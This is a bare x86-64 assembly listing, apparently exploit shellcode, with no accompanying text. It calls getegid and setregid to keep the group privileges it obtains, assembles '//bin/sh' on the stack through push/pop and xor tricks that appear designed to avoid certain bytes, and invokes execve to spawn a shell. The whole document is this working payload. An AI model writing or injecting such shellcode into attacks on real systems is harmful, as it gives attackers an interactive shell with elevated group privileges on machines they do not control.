
.globl main
.type  main @function
main:
    push $0x6c
    pop  %rax
    syscall

    push %rax
    push %rax
    pop  %rdi
    pop  %rsi

    push $0x72
    pop  %rax
    syscall


    push $0x31
    pop  %rax
    xor  $0x31, %al
    push %rax
    push %rax
    pop  %rsi
    pop  %rdx
    push $0x69622f2f
    push $0x68732f6e
    pop  %rax
    xor  %eax, 0x4(%rsp)

    push %rsp
    pop  %rdi
    push $0x3b
    pop  %rax
    syscall

